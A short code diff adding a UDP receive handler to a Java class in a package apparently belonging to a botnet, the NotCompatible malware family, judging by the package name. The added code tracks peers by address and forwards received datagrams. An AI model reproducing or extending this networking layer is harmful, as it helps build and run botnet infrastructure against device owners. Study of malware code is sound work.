@@ -1,6 +1,9 @@
 package diff.notcompatible.c.bot.net.udp;
 
+import java.io.IOException;
 import java.net.InetSocketAddress;
+import java.nio.ByteBuffer;
+import java.nio.channels.SelectionKey;
 
 import diff.notcompatible.c.bot.ThreadServer;
 import diff.notcompatible.c.bot.net.udp.objects.UDPPointList;
@@ -101,5 +104,25 @@ public class UDPMixer extends UDPSocket {
         b[3] = (byte) (Integer.parseInt(x[3]) & 0xFF);
         
         return b;
+    }
+
+    public void onRead(SelectionKey key) throws IOException {
+        super.onRead(key);
+        try {
+            ByteBuffer tmp = ByteBuffer.allocate(8192);
+            tmp.clear();
+            InetSocketAddress sa = (InetSocketAddress) channel.receive(tmp);
+            byte[] tmp2 = new byte[tmp.position()];
+            System.arraycopy(tmp.array(), 0, tmp2, 0, tmp.position());
+            UDPPoint up = list.getByInetSocketAddress(sa);
+            if (up == null) {
+                up = new UDPPoint(this);
+                up.endPoint = sa;
+                list.add(up);
+            }
+            up.onRecv(tmp2);
+        } catch (Exception exception) {
+        	exception.printStackTrace();
+        }
     }
 }
